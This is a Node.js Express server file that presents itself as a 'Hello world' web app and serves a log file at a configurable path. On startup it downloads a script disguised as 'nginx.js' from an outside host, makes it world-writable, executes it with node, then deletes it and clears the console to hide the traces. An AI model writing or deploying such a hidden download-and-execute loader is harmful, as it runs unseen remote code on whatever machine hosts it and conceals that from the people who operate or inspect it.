const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const os = require('os'); // 导入 os 模块以获取系统临时目录
const { exec } = require('child_process');

const SUB_PATH = process.env.SUB_PATH || 'sub';
const PORT = process.env.PORT || 3000; 

// 修复核心：如果环境变量没有指定 FILE_PATH，则自动使用系统提供的可写临时目录（如 /tmp/belmo_tmp）
const FILE_PATH = process.env.FILE_PATH || path.join(os.tmpdir(), 'belmo_tmp');

if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH, { recursive: true }); // 使用 recursive 确保多级目录也能创建成功
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

app.get("/", function(req, res) {
  res.send("Hello world!");
});

const subTxtPath = path.join(FILE_PATH, 'log.txt');
app.get(`/${SUB_PATH}`, (req, res) => {
  fs.readFile(subTxtPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

// Specify the URL of the bot.js file to download
const fileUrl = 'https://main.ssss.nyc.mn/nginx.js';
const fileName = 'nginx.js';
const filePath = path.join(FILE_PATH, fileName);

// Download and execute the file
const downloadAndExecute = () => {
  const fileStream = fs.createWriteStream(filePath);

  axios
    .get(fileUrl, { responseType: 'stream' })
    .then(response => {
      response.data.pipe(fileStream);
      return new Promise((resolve, reject) => {
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });
    })
    .then(() => {
      console.log('File downloaded successfully.');
      
      // 注意：某些严格的 Serverless 环境可能也不允许在 /tmp 中使用 chmod 777，
      // 但绝大多数环境（如 AWS Lambda, Docker）在 /tmp 下是允许的。
      try {
        fs.chmodSync(filePath, '777'); 
      } catch (chmodErr) {
        console.warn(`Warning: chmod failed but continuing: ${chmodErr.message}`);
      }

      console.log('running the webapp...');
      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`${error}`);
          return;
        }
        console.log(`${stdout}`);
        console.error(`${stderr}`);
      });

      child.on('exit', (code) => {
      //  console.log(`Child process exited with code ${code}`);
        fs.unlink(filePath, err => {
          if (err) {
            console.error(`Error deleting file: ${err}`);
          } else {
            console.clear();
            console.log(`App is running!`);
          }
        });
      });
    })
    .catch(error => {
      console.error(`Download error: ${error}`);
    });
};
downloadAndExecute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
